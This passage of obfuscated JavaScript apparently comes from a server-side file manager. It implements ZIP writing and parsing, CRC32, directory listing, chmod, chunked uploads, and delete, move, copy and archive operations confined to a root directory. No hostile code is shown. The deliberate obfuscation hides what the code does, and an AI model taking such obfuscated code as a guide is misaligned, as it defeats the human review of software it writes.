    static [a0aY(0x33b)] = 0x200 * 0x400 * 0x400;
    static [a0aY(0x650)] = 0x1f4;
    static [a0aY(0x2af)] = null;
    static [a0aY(0x424)](a) {
        const c5 = a0aY, b = {
                'xutzg': function (g, h) {
                    return g < h;
                },
                'BBrny': function (g, h) {
                    return g < h;
                },
                'XjWYt': function (g, h) {
                    return g & h;
                },
                'RxWFJ': function (g, h) {
                    return g ^ h;
                },
                'hujUb': function (g, h) {
                    return g >>> h;
                },
                'lBFHe': function (g, h) {
                    return g >>> h;
                }
            };
        if (!a0X['_crcTable']) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; b[c5(0x2ca)](h, 0x100); h++) {
                let j = h;
                for (let l = 0x0; b['BBrny'](l, 0x8); l++)
                    j = b[c5(0x33a)](j, 0x1) ? b['RxWFJ'](0xedb88320, j >>> 0x1) : j >>> 0x1;
                g[h] = j;
            }
            a0X[c5(0x2af)] = g;
        }
        const d = a0X['_crcTable'];
        let f = -0x1;
        for (let m = 0x0; b[c5(0x2ca)](m, a[c5(0x7bc)]); m++)
            f = b[c5(0x3b6)](b[c5(0x843)](f, 0x8), d[b[c5(0x33a)](f ^ a[m], 0xff)]);
        return b[c5(0x6d8)](f ^ -0x1, 0x0);
    }
    static [a0aY(0x724)](a) {
        const c6 = a0aY, b = {
                'PQrIc': function (g, h) {
                    return g & h;
                },
                'CHKcL': function (g, h) {
                    return g | h;
                },
                'iZZUI': function (g, h) {
                    return g << h;
                },
                'UrqbX': function (g, h) {
                    return g << h;
                },
                'QjLiV': function (g, h) {
                    return g >> h;
                },
                'BImLZ': function (g, h) {
                    return g & h;
                },
                'UFeiK': function (g, h) {
                    return g | h;
                }
            }, c = b['PQrIc'](b['CHKcL'](b['iZZUI'](a[c6(0x59a)](), 0xb) | b['UrqbX'](a[c6(0x202)](), 0x5), b[c6(0x76b)](a[c6(0x114)](), 0x1)), 0xffff), f = b[c6(0x692)](b[c6(0x3d0)](b[c6(0x194)](a[c6(0x399)]() - 0x7bc << 0x9, b[c6(0x125)](a[c6(0x42e)]() + 0x1, 0x5)), a[c6(0x4c3)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0aY(0x1ce)](a) {
        const c7 = a0aY, b = {
                'ZiQZJ': function (i, j) {
                    return i < j;
                },
                'MWKnp': function (i, j) {
                    return i >= j;
                },
                'pQxJk': c7(0x31e),
                'AxvQk': function (i, j) {
                    return i < j;
                },
                'ynmGW': function (i, j) {
                    return i(j);
                },
                'HFIJt': function (i, j) {
                    return i + j;
                },
                'FjEIP': function (i, j) {
                    return i(j);
                }
            }, c = a0l[c7(0x81b)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const c8 = c7;
            let j = 0x0;
            while (b[c8(0x262)](j, i['length']))
                j += a0l[c8(0x83d)](c, i, j, i[c8(0x7bc)] - j);
        };
        return {
            'add'(i, j, k, l = ![]) {
                const c9 = c7;
                if (b[c9(0x104)](g, a0X[c9(0x3ae)]))
                    return ![];
                const m = Buffer[c9(0x664)](i, b['pQxJk']);
                j = j || Buffer['alloc'](0x0);
                const n = l ? 0x0 : a0X[c9(0x424)](j);
                let o = 0x0, p = j;
                if (!l && j[c9(0x7bc)] > 0x0) {
                    const u = a0n[c9(0x7e3)](j, { 'level': 0x6 });
                    b[c9(0x733)](u[c9(0x7bc)], j['length']) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0X[c9(0x724)](k || new Date()), s = Buffer[c9(0x4b7)](0x1e);
                s[c9(0x409)](0x4034b50, 0x0), s['writeUInt16LE'](0x14, 0x4), s[c9(0x7af)](0x800, 0x6), s[c9(0x7af)](o, 0x8), s['writeUInt16LE'](q, 0xa), s['writeUInt16LE'](r, 0xc), s[c9(0x409)](n, 0xe), s['writeUInt32LE'](p[c9(0x7bc)], 0x12), s['writeUInt32LE'](j[c9(0x7bc)], 0x16), s[c9(0x7af)](m[c9(0x7bc)], 0x1a), s[c9(0x7af)](0x0, 0x1c), b['ynmGW'](h, s), b[c9(0x599)](h, m), b[c9(0x599)](h, p);
                const t = Buffer['alloc'](0x2e);
                return t[c9(0x409)](0x2014b50, 0x0), t[c9(0x7af)](0x14, 0x4), t[c9(0x7af)](0x14, 0x6), t[c9(0x7af)](0x800, 0x8), t['writeUInt16LE'](o, 0xa), t[c9(0x7af)](q, 0xc), t[c9(0x7af)](r, 0xe), t[c9(0x409)](n, 0x10), t['writeUInt32LE'](p['length'], 0x14), t[c9(0x409)](j[c9(0x7bc)], 0x18), t['writeUInt16LE'](m[c9(0x7bc)], 0x1c), t[c9(0x7af)](0x0, 0x1e), t[c9(0x7af)](0x0, 0x20), t[c9(0x7af)](0x0, 0x22), t[c9(0x7af)](0x0, 0x24), t['writeUInt32LE'](l ? 0x10 : 0x0, 0x26), t[c9(0x409)](f, 0x2a), d[c9(0x560)](t, m), f += b['HFIJt'](0x1e, m[c9(0x7bc)]) + p[c9(0x7bc)], g++, !![];
            },
            'close'() {
                const ca = c7, i = Buffer['concat'](d), j = Buffer[ca(0x4b7)](0x16);
                return j['writeUInt32LE'](0x6054b50, 0x0), j['writeUInt16LE'](0x0, 0x4), j[ca(0x7af)](0x0, 0x6), j[ca(0x7af)](g, 0x8), j['writeUInt16LE'](g, 0xa), j[ca(0x409)](i[ca(0x7bc)], 0xc), j[ca(0x409)](f, 0x10), j[ca(0x7af)](0x0, 0x14), b[ca(0xe4)](h, i), b[ca(0xe4)](h, j), a0l[ca(0x11d)](c), g;
            }
        };
    }
    static ['parse'](a) {
        const cb = a0aY, b = {
                'CzUbt': function (n, o) {
                    return n + o;
                },
                'qemvf': function (n, o) {
                    return n >= o;
                },
                'vJxZz': function (n, o) {
                    return n < o;
                },
                'dQiyp': 'Not\x20a\x20zip\x20file',
                'SfGqr': function (n, o) {
                    return n + o;
                },
                'PDWeU': function (n, o) {
                    return n <= o;
                },
                'qUmoW': function (n, o) {
                    return n !== o;
                },
                'jOSeA': function (n, o) {
                    return n + o;
                },
                'lmpNJ': function (n, o) {
                    return n + o;
                },
                'pxXQB': function (n, o) {
                    return n + o;
                },
                'NRdNr': function (n, o) {
                    return n + o;
                },
                'lstxV': cb(0x31e),
                'NRrZP': function (n, o) {
                    return n + o;
                },
                'wffjm': function (n, o) {
                    return n !== o;
                },
                'UrFTk': function (n, o) {
                    return n === o;
                },
                'ealPy': function (n, o) {
                    return n === o;
                },
                'TRljE': function (n, o) {
                    return n + o;
                },
                'OecrY': function (n, o) {
                    return n + o;
                }
            }, c = a0l[cb(0x23e)](a);
        let d = -0x1;
        const f = Math[cb(0x217)](0x0, c[cb(0x7bc)] - b['CzUbt'](0xffff, 0x16));
        for (let n = c[cb(0x7bc)] - 0x16; b[cb(0x4f2)](n, f); n--) {
            if (c['readUInt32LE'](n) === 0x6054b50) {
                d = n;
                break;
            }
        }
        if (b[cb(0x58b)](d, 0x0))
            throw new Error(b[cb(0x331)]);
        const g = c[cb(0x179)](b[cb(0x7ac)](d, 0xa)), h = c[cb(0x300)](d + 0xc), j = c[cb(0x300)](d + 0x10), k = [];
        let l = j;
        const m = j + h;
        for (let o = 0x0; o < g && b['PDWeU'](b[cb(0x504)](l, 0x2e), m); o++) {
            if (b[cb(0x6d7)](c['readUInt32LE'](l), 0x2014b50))
                break;
            const q = c[cb(0x179)](l + 0x8), r = c['readUInt16LE'](b[cb(0x7ac)](l, 0xa)), s = c[cb(0x300)](b[cb(0x7ac)](l, 0x10)), t = c[cb(0x300)](b[cb(0x504)](l, 0x14)), u = c['readUInt32LE'](b[cb(0x7ac)](l, 0x18)), v = c[cb(0x179)](b[cb(0x7ac)](l, 0x1c)), w = c[cb(0x179)](b['jOSeA'](l, 0x1e)), x = c[cb(0x179)](b['SfGqr'](l, 0x20)), y = c['readUInt32LE'](b[cb(0x7d3)](l, 0x26)), z = c[cb(0x300)](b[cb(0x2d0)](l, 0x2a)), A = c[cb(0x462)](b[cb(0x504)](l, 0x2e), b[cb(0x504)](b[cb(0x2f3)](l, 0x2e), v))['toString'](b['lstxV']);
            l += b[cb(0x2d0)](b[cb(0x504)](b[cb(0x699)](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A['endsWith']('/') || (y & 0x10) !== 0x0,
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[cb(0x84c)](q & 0x1, 0x0),
                'zip64': t === 0xffffffff || b['UrFTk'](u, 0xffffffff) || b[cb(0x6dc)](z, 0xffffffff),
                'data': null
            };
            if (!B['isDir'] && !B[cb(0x7c9)] && !B[cb(0x44d)]) {
                if (b[cb(0x7d3)](z, 0x1e) <= c['length'] && b[cb(0x460)](c[cb(0x300)](z), 0x4034b50)) {
                    const C = c[cb(0x179)](z + 0x1a), D = c[cb(0x179)](b[cb(0x504)](z, 0x1c)), E = b['TRljE'](b[cb(0x35f)](b[cb(0x7ac)](z, 0x1e), C), D);
                    b[cb(0x247)](b[cb(0x2d0)](E, t), c[cb(0x7bc)]) && (B[cb(0x54a)] = c[cb(0x462)](E, b[cb(0x7ac)](E, t)));
                }
            }
            k[cb(0x560)](B);
        }
        return k;
    }
    static [a0aY(0x634)](a) {
        const cc = a0aY, b = {
                'LLDxX': function (c, d) {
                    return c === d;
                },
                'iUATf': function (c, d) {
                    return c === d;
                }
            };
        if (b[cc(0x1b1)](a[cc(0x57b)], 0x0))
            return a[cc(0x54a)];
        if (b['iUATf'](a[cc(0x57b)], 0x8))
            return a0n[cc(0x30c)](a[cc(0x54a)]);
        throw new Error('Unsupported\x20zip\x20method:\x20' + a[cc(0x57b)]);
    }
}
class a0Y {
    static async [a0aY(0x7a5)](a, b = ![]) {
        const cd = a0aY, c = {
                'RxvDC': cd(0x124),
                'BuysJ': function (h, i) {
                    return h & i;
                },
                'HEUif': function (h, i) {
                    return h(i);
                },
                'YTaHJ': function (h, i) {
                    return h || i;
                },
                'zRMgE': function (h, i) {
                    return h(i);
                },
                'vsyCQ': cd(0x1e7),
                'OhMWF': function (h, i) {
                    return h(i);
                }
            }, d = a0o[cd(0x2c6)](a0P[cd(0x394)], c['YTaHJ'](a, '.'));
        if (!c[cd(0x1db)](a0W, d))
            throw new Error(c[cd(0x6ec)]);
        if (!a0l[cd(0x291)](d))
            throw new Error(cd(0x572));
        const f = [], g = h => {
                const ce = cd, i = a0l[ce(0x389)](h);
                for (const j of i) {
                    const k = a0o[ce(0x16d)](h, j), l = a0l[ce(0x52c)](k), m = new a0L();
                    m['name'] = j, m[ce(0x7d7)] = a0o[ce(0x5a5)](a0P[ce(0x394)], k), m['type'] = l[ce(0xd7)]() ? c[ce(0xd2)] : ce(0x37e), m[ce(0x540)] = l[ce(0x540)], m['mtime'] = l['mtime'][ce(0x2e6)](), m[ce(0x1ac)] = this[ce(0x24b)](l[ce(0x1ac)], l[ce(0xd7)]()), m[ce(0x30a)] = '0o' + c[ce(0x834)](l[ce(0x1ac)], 0x1ff)[ce(0xec)](0x8), m[ce(0x74e)] = l[ce(0x1b2)] + ':' + l['gid'], f[ce(0x560)](m), b && l[ce(0xd7)]() && c[ce(0x56e)](g, k);
                }
            };
        return c['OhMWF'](g, d), f;
    }
    static async [a0aY(0x51f)](a) {
        const cf = a0aY, b = {
                'JxTOd': function (d, f) {
                    return d(f);
                },
                'RxZCP': cf(0x124),
                'lfEqx': cf(0x37e)
            }, c = [];
        for (const d of a) {
            const f = a0o[cf(0x2c6)](a0P[cf(0x394)], d);
            if (!b[cf(0x5d8)](a0W, f))
                continue;
            try {
                const g = a0l['statSync'](f), h = this[cf(0x593)](f, a0l[cf(0x667)][cf(0x1be)]), i = this[cf(0x593)](f, a0l[cf(0x667)][cf(0xd6)]), j = this[cf(0x593)](f, a0l[cf(0x667)][cf(0x5e3)]), k = new a0M();
                k['path'] = a0o[cf(0x5a5)](a0P[cf(0x394)], f), k[cf(0x467)] = a0o[cf(0x146)](f), k[cf(0x1ac)] = this[cf(0x24b)](g[cf(0x1ac)], g[cf(0xd7)]()), k['mode_octal'] = '0o' + (g[cf(0x1ac)] & 0x1ff)[cf(0xec)](0x8), k[cf(0x565)] = g[cf(0xd7)]() ? b[cf(0x3c8)] : b[cf(0x65c)], k[cf(0x9b)] = h, k[cf(0x614)] = i, k[cf(0x794)] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aY(0x593)](a, b) {
        const cg = a0aY;
        try {
            return a0l[cg(0x70d)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const ch = a0aY, b = {
                'KsVKu': function (c, d) {
                    return c === d;
                },
                'HAXRb': function (c, d) {
                    return c === d;
                },
                'JuFjX': function (c, d, f) {
                    return c(d, f);
                },
                'BdTBm': ch(0x10c)
            };
        if (b[ch(0x20a)](typeof a, ch(0xdf)))
            return a;
        if (b['HAXRb'](typeof a, ch(0x446))) {
            const c = a[ch(0x450)]();
            if (/^[0-7]{3,4}$/[ch(0x75b)](c))
                return b[ch(0x9e)](parseInt, c, 0x8);
        }
        throw new Error(b[ch(0x6bd)]);
    }
    static [a0aY(0x24b)](a, b) {
        const ci = a0aY, c = {
                'uvfQf': function (i, j) {
                    return i & j;
                },
                'ZQzss': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[ci(0x7c6)](a, 0x1ff)[ci(0xec)](0x8)[ci(0x818)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[ci(0x660)](parseInt, i, 0xa);
            h += f[ci(0x415)]((k, l) => j & 0x4 >> l ? k : '-')[ci(0x16d)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const cj = a0aY, c = {
                'ldrKd': function (g, h) {
                    return g(h);
                },
                'CpLOL': function (g, h) {
                    return g(h);
                },
                'adASU': cj(0x57d),
                'vhmlL': function (g, h) {
                    return g(h);
                }
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0o[cj(0x2c6)](a0P[cj(0x394)], g);
            if (!c[cj(0x3ba)](a0W, i)) {
                d[cj(0x560)]({
                    'path': g,
                    'requested': c[cj(0x1a3)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[cj(0x39c)]
                });
                continue;
            }
            try {
                const j = this[cj(0x4f1)](h), k = m => {
                        const ck = cj;
                        a0l[ck(0x227)](m, j);
                    };
                if (b && a0l[cj(0x291)](i) && a0l[cj(0x52c)](i)[cj(0xd7)]()) {
                    const m = n => {
                        const cl = cj;
                        c[cl(0x3ba)](k, n);
                        const o = a0l[cl(0x389)](n);
                        for (const p of o) {
                            const q = a0o[cl(0x16d)](n, p);
                            a0l['statSync'](q)[cl(0xd7)]() ? c['ldrKd'](m, q) : c['ldrKd'](k, q);
                        }
                    };
                    c[cj(0x47a)](m, i);
                } else
                    c['vhmlL'](k, i);
                const l = j[cj(0xec)](0x8);
                d['push']({
                    'path': g,
                    'requested': c['vhmlL'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[cj(0x560)]({
                    'path': g,
                    'requested': c[cj(0x47a)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': cj(0x1c6),
                    'message': n[cj(0x5a9)]
                });
            }
        }
        const f = d[cj(0xfb)](o => o[cj(0x75d)] === 'ok')['length'];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0aY(0x1f4)](a) {
        const cm = a0aY, b = {
                'rPphS': function (h, i) {
                    return h(i);
                },
                'lclvw': cm(0x1e7),
                'Idcit': function (h, i) {
                    return h > i;
                },
                'YlUhS': function (h, i) {
                    return h * i;
                },
                'LAolT': cm(0x3ef),
                'AvHFg': cm(0x31e),
                'gAQfs': cm(0x2df),
                'samqT': cm(0x770)
            }, c = a0o[cm(0x2c6)](a0P[cm(0x394)], a);
        if (!b[cm(0x7c0)](a0W, c))
            throw new Error(b[cm(0x297)]);
        const d = a0l[cm(0x52c)](c);
        if (b['Idcit'](d[cm(0x540)], b[cm(0x5b6)](0x400, 0x400)))
            throw new Error(b['LAolT']);
        const f = a0l[cm(0x23e)](c), g = this[cm(0x3d4)](f);
        return {
            'status': 'ok',
            'path': a0o['relative'](a0P[cm(0x394)], c),
            'content': g ? a0w['fromByteArray'](f) : f['toString'](b[cm(0x12e)]),
            'encoding': g ? b[cm(0x74b)] : b['samqT'],
            'is_binary': g,
            'size': d[cm(0x540)]
        };
    }
    static [a0aY(0x3d4)](a) {
        const cn = a0aY, b = {
                'YOFLf': function (c, d) {
                    return c === d;
                },
                'RFNYc': function (c, d) {
                    return c < d;
                },
                'nVDwr': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[cn(0x6f1)](a[cn(0x7bc)], 0x0))
            return ![];
        for (let c = 0x0; b[cn(0x3ff)](c, Math['min'](a[cn(0x7bc)], 0x200)); c++) {
            if (b[cn(0x156)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const co = a0aY, g = {
                'tjDkb': function (l, m) {
                    return l(m);
                },
                'fnhLM': function (l, m) {
                    return l > m;
                },
                'uJPkL': function (l, m) {
                    return l !== m;
                },
                'KuABc': function (l, m) {
                    return l !== m;
                },
                'ntjhQ': function (l, m) {
                    return l(m);
                },
                'vkRrC': function (l, m) {
                    return l(m);
                },
                'PZoWK': 'chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric',
                'eMjxs': co(0xda),
                'osRkW': function (l, m) {
                    return l < m;
                }
            }, h = a0o['resolve'](a0P[co(0x394)], a);
        let j = h;
        b && (j = a0o['join'](h, b));
        if (!g[co(0x23b)](a0W, j))
            throw new Error(co(0x1e7));
        !a0l['existsSync'](a0o[co(0x2d4)](j)) && a0l['mkdirSync'](a0o[co(0x2d4)](j), { 'recursive': !![] });
        const k = a0w['toByteArray'](c);
        if (g[co(0xe3)](k['length'], a0P['MAX_UPLOAD_SIZE']))
            throw new Error('File\x20too\x20large');
        if (g['uJPkL'](d, null) && g['KuABc'](f, null)) {
            const l = g['ntjhQ'](Number, d), m = g[co(0x435)](Number, f);
            if (Number[co(0x697)](l) || Number[co(0x697)](m))
                throw new Error(g[co(0xae)]);
            const n = a0o[co(0x16d)](a0o[co(0x2d4)](j), g['eMjxs'], a0o[co(0x146)](j));
            !a0l['existsSync'](n) && a0l[co(0x340)](n, { 'recursive': !![] });
            const o = a0o['join'](n, co(0x131) + l);
            a0l[co(0x67a)](o, k);
            const p = a0l[co(0x389)](n)['filter'](s => s[co(0x315)](co(0x131))), q = p[co(0x7bc)], r = q === m;
            if (r) {
                const s = a0l['createWriteStream'](j);
                for (let u = 0x0; g[co(0x78f)](u, m); u++) {
                    const v = a0o[co(0x16d)](n, co(0x131) + u);
                    if (!a0l[co(0x291)](v)) {
                        s['close']();
                        throw new Error('Missing\x20chunk\x20' + u);
                    }
                    s[co(0x81f)](a0l['readFileSync'](v));
                }
                s[co(0x581)]();
                const t = a0o['dirname'](n);
                a0l['rmSync'](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[co(0x5a5)](a0P[co(0x394)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[co(0x67a)](j, k), {
            'status': 'ok',
            'path': a0o[co(0x5a5)](a0P[co(0x394)], j),
            'received': k[co(0x7bc)],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const cp = a0aY, g = {
                'gxOEe': function (k, l) {
                    return k || l;
                },
                'PYmFQ': function (k, l) {
                    return k(l);
                },
                'hkNLa': cp(0x1e7),
                'tKAhd': function (k, l) {
                    return k > l;
                },
                'QdtRK': 'File\x20too\x20large',
                'PAAMk': function (k, l) {
                    return k !== l;
                },
                'tUpeN': cp(0x616),
                'AzuQO': cp(0xda),
                'MvmHS': function (k, l) {
                    return k === l;
                },
                'VKleK': function (k, l) {
                    return k < l;
                },
                'gfFaj': cp(0x1c8),
                'LaRns': cp(0x379)
            }, h = a0o['resolve'](a0P[cp(0x394)], g[cp(0x426)](a, '.'));
        let j = h;
        b && (j = a0o[cp(0x16d)](h, b));
        if (!g[cp(0xf3)](a0W, j))
            throw new Error(g['hkNLa']);
        !a0l['existsSync'](a0o['dirname'](j)) && a0l[cp(0x340)](a0o[cp(0x2d4)](j), { 'recursive': !![] });
        if (g[cp(0x7c4)](c[cp(0x7bc)], a0P['MAX_UPLOAD_SIZE']))
            throw new Error(g[cp(0x3df)]);
        if (d !== null && g[cp(0x603)](f, null)) {
            const k = Number(d), l = g['PYmFQ'](Number, f);
            if (Number[cp(0x697)](k) || Number[cp(0x697)](l))
                throw new Error(g[cp(0x760)]);
            const m = a0o[cp(0x16d)](a0o[cp(0x2d4)](j), g['AzuQO'], a0o[cp(0x146)](j));
            !a0l['existsSync'](m) && a0l[cp(0x340)](m, { 'recursive': !![] });
            const n = a0o['join'](m, cp(0x131) + k);
            a0l['writeFileSync'](n, c);
            const o = a0l[cp(0x389)](m)[cp(0xfb)](r => r[cp(0x315)](cp(0x131))), p = o['length'], q = g[cp(0x693)](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; g['VKleK'](t, l); t++) {
                    const u = a0o['join'](m, cp(0x131) + t);
                    if (!a0l[cp(0x291)](u))
                        throw new Error(cp(0x511) + t);
                    r[cp(0x560)](a0l[cp(0x23e)](u));
                }
                a0l['writeFileSync'](j, Buffer['concat'](r));
                const s = a0o['dirname'](m);
                a0l['rmSync'](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cp(0x586)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o['relative'](a0P[cp(0x394)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[cp(0x4fb)]
                };
            }
            return {
                'status': 'ok',
                'path': a0o['relative'](a0P[cp(0x394)], j),
                'chunk_id': k,
                'completed': ![],
                'message': cp(0x1b0) + k + '\x20uploaded.\x20Waiting\x20for\x20remaining\x20blocks.'
            };
        }
        return a0l[cp(0x67a)](j, c), {
            'status': 'ok',
            'path': a0o['relative'](a0P[cp(0x394)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[cp(0x241)]
        };
    }
    static async [a0aY(0x26a)](a) {
        const cq = a0aY, b = {
                'yPRHJ': function (g, h) {
                    return g(h);
                },
                'JxKRb': 'Access\x20denied:\x20path\x20outside\x20root',
                'zBbxX': cq(0x3d2)
            }, c = a0o[cq(0x2c6)](a0P[cq(0x394)], a);
        if (!b['yPRHJ'](a0W, c))
            throw new Error(b[cq(0x37c)]);
        if (!a0l[cq(0x291)](c))
            throw new Error(b[cq(0x123)]);
        const d = a0l[cq(0x52c)](c), f = await a0l['promises'][cq(0x1f4)](c);
        return {
            'path': a0o[cq(0x5a5)](a0P[cq(0x394)], c),
            'content': f,
            'size': d[cq(0x540)]
        };
    }
    static async [a0aY(0x5ef)](a) {
        const cr = a0aY, b = {
                'FUTvK': function (d, f) {
                    return d(f);
                },
                'rSrxV': cr(0x80c),
                'TpcTj': cr(0x1c6)
            }, c = [];
        for (const d of a) {
            const f = a0o[cr(0x2c6)](a0P[cr(0x394)], d);
            if (!b['FUTvK'](a0W, f)) {
                c['push']({
                    'path': d,
                    'status': cr(0x57d)
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[cr(0x52c)](f);
                    g[cr(0xd7)]() ? a0l['rmSync'](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[cr(0x7db)](f), c['push']({
                        'path': d,
                        'status': 'deleted'
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': b[cr(0x326)]
                    });
            } catch (h) {
                c[cr(0x560)]({
                    'path': d,
                    'status': b['TpcTj'],
                    'message': h[cr(0x5a9)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const cs = a0aY, b = {
                'iptXa': function (d, f) {
                    return d(f);
                },
                'FXTzp': function (d, f) {
                    return d(f);
                },
                'guHxX': cs(0x1c6)
            }, c = [];
        for (const [d, f] of Object[cs(0x2b2)](a)) {
            const g = a0o['resolve'](a0P[cs(0x394)], d), h = a0o[cs(0x2c6)](a0P[cs(0x394)], f);
            if (!b['iptXa'](a0W, g) || !b[cs(0x7ed)](a0W, h)) {
                c[cs(0x560)]({
                    'from': d,
                    'to': f,
                    'status': cs(0x57d)
                });
                continue;
            }
            try {
                const i = a0o[cs(0x2d4)](h);
                !a0l[cs(0x291)](i) && a0l[cs(0x340)](i, { 'recursive': !![] }), a0l[cs(0x83c)](g, h), c[cs(0x560)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[cs(0x560)]({
                    'from': d,
                    'to': f,
                    'status': b['guHxX'],
                    'message': j['message']
                });
            }
        }
        return c;
    }
    static async ['copyFiles'](a) {
        const ct = a0aY, b = {
                'vRzhC': function (d, f, g) {
                    return d(f, g);
                },
                'pgOMD': function (d, f) {
                    return d(f);
                },
                'SVtNM': 'access_denied',
                'XzuQO': ct(0x80c),
                'blJao': function (d, f, g) {
                    return d(f, g);
                }
            }, c = [];
        for (const [d, f] of Object[ct(0x2b2)](a)) {
            const g = a0o['resolve'](a0P['FILE_ROOT'], d), h = a0o['resolve'](a0P[ct(0x394)], f);
            if (!b['pgOMD'](a0W, g) || !a0W(h)) {
                c[ct(0x560)]({
                    'from': d,
                    'to': f,
                    'status': b[ct(0x5b7)]
                });
                continue;
            }
            try {
                if (!a0l['existsSync'](g)) {
                    c[ct(0x560)]({
                        'from': d,
                        'to': f,
                        'status': b[ct(0x6f4)]
                    });
                    continue;
                }
                const i = a0o[ct(0x2d4)](h);
                !a0l[ct(0x291)](i) && a0l[ct(0x340)](i, { 'recursive': !![] });
                const j = a0l[ct(0x52c)](g);
                if (j[ct(0xd7)]()) {
                    if (a0l[ct(0x7b8)])
                        a0l[ct(0x7b8)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cu = ct;
                            if (a0l['statSync'](l)[cu(0xd7)]()) {
                                if (!a0l[cu(0x291)](m))
                                    a0l[cu(0x340)](m, { 'recursive': !![] });
                                for (const n of a0l[cu(0x389)](l)) {
                                    b['vRzhC'](k, a0o[cu(0x16d)](l, n), a0o['join'](m, n));
                                }
                            } else
                                a0l['copyFileSync'](l, m);
                        };
                        b[ct(0x836)](k, g, h);
                    }
                } else
                    a0l['copyFileSync'](g, h);
                c[ct(0x560)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[ct(0x560)]({
                    'from': d,
                    'to': f,
                    'status': 'error',
                    'message': l[ct(0x5a9)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const cv = a0aY, b = {
                'ytiSM': function (d, f) {
                    return d(f);
                },
                'ugsyt': cv(0x1e7)
            }, c = a0o[cv(0x2c6)](a0P[cv(0x394)], a);
        if (!b[cv(0x16a)](a0W, c))
            throw new Error(b[cv(0x7ba)]);
        return a0l[cv(0x340)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[cv(0x5a5)](a0P[cv(0x394)], c)
        };
    }
    static [a0aY(0x2b1)](a) {
        const cw = a0aY;
        return a0o['relative'](a0P[cw(0x394)], a) || '.';
    }
    static async [a0aY(0x6b7)](a, b, c = ![]) {
        const cx = a0aY, d = {
                'umjbG': function (k, l, m) {
                    return k(l, m);
                },
                'HZivE': function (k, l) {
                    return k === l;
                },
                'Emzil': cx(0x669),
                'VfjAV': function (k, l) {
                    return k(l);
                },
                'CBpQE': cx(0x6bb),
                'LzRTx': function (k, l) {
                    return k || l;
                },
                'vJncp': cx(0x80c),
                'tuJIz': 'error'
            };
        if (!a)
            throw new Error(cx(0x7de));
        if (!Array['isArray'](b) || d[cx(0x490)](b['length'], 0x0))
            throw new Error(d[cx(0x532)]);
        const f = a0o['resolve'](a0P[cx(0x394)], a);
        if (!d[cx(0x6a3)](a0W, f))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        if (a0l['existsSync'](f) && a0l[cx(0x52c)](f)[cx(0xd7)]())
            throw new Error(cx(0x5a4) + a);
        a0l['mkdirSync'](a0o['dirname'](f), { 'recursive': !![] });
        if (a0l['existsSync'](f))
            a0l['unlinkSync'](f);
        const g = a0X[cx(0x1ce)](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h[cx(0x560)]({
                    'item': k,
                    'status': d['CBpQE'],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o['resolve'](a0P['FILE_ROOT'], d[cx(0x339)](k, ''));
            try {
                if (!d[cx(0x6a3)](a0W, l)) {
                    h[cx(0x560)]({
                        'item': k,
                        'status': cx(0x1c6),
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[cx(0x291)](l)) {
                    h[cx(0x560)]({
                        'item': k,
                        'status': d[cx(0x543)],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[cx(0x52c)](l);
                let n = 0x0, o = ![];
                if (m[cx(0x6c7)]()) {
                    if (!g[cx(0x503)](a0o[cx(0x146)](l), a0l['readFileSync'](l), m[cx(0x1f7)])) {
                        j = !![], h[cx(0x560)]({
                            'item': k,
                            'status': cx(0x6bb),
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[cx(0xd7)]()) {
                        const p = a0o[cx(0x146)](l), q = (r, s) => {
                                const cy = cx;
                                for (const t of a0l[cy(0x389)](r)) {
                                    const u = a0o[cy(0x16d)](r, t), v = s ? s + '/' + t : t, w = a0l['statSync'](u);
